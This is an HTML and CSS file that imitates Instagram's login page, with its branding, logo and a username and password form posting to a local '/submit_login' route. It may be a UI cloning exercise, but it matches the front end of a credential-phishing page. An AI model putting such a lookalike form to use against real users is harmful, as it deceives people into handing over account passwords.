<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            height: 100vh;
            background-color: #fafafa;
        }

        /* Main Container */
        .container {
            display: flex;
            width: 100%;
            max-width: 960px;
            height: 100%;
        }

        /* Left Section (Mobile View) */
        .left-section {
            flex: 1;
            background-color: #f0f0f0;
            background-image: url('images/mobileImage.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            padding: 20px;
            box-sizing: border-box;
        }

        .left-section h2 {
            font-size: 2rem;
            text-align: center;
        }

        /* Right Section (Login Form) */
        .right-section {
            flex: 1;
            background-color: white;
            padding: 40px;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        /* Instagram Logo */
        .instagram-logo {
            width: 150px;
            margin-bottom: 20px;
        }

        /* Form */
        form {
            width: 100%;
            max-width: 300px;
        }

        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border-radius: 5px;

            border: 1px solid #dbdbdb;
            box-sizing: border-box;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1rem;
        }

        button:hover {
            background-color: #0078d4;
        }

        .forgot-password {
            font-size: 0.9rem;
            color: #385185;
            text-decoration: none;
            text-align: center;
            margin-top: 10px;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .divider {
            width: 100%;
            text-align: center;
            margin: 20px 0;
        }

        .divider span {
            background-color: #dbdbdb;
            padding: 0 10px;
            font-size: 1rem;
            color: #888;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Left Section (Mobile View) -->
        <div class="left-section">
            <h2>Instagram</h2>
        </div>

        <!-- Right Section (Login Form) -->
        <div class="right-section">
            <img src="images/instagramLogo.jpg" alt="Instagram Logo" class="instagram-logo">
            
            <form action="/submit_login" method="POST">
                <!-- Username Field -->
                <input type="text" name="username" placeholder="Username" required><br>

                <!-- Password Field -->
                <input type="password" name="password" placeholder="Password" required><br>

                <!-- Login Button -->
                <button type="submit">Log In</button>
            </form>

            <a href="#" class="forgot-password">Forgot password?</a>

            <div class="divider">
                <span>OR</span>
            </div>

            <!-- Signup Link -->
            <a href="#" class="forgot-password">Don't have an account? Sign up</a>
        </div>
    </div>

</body>
</html>
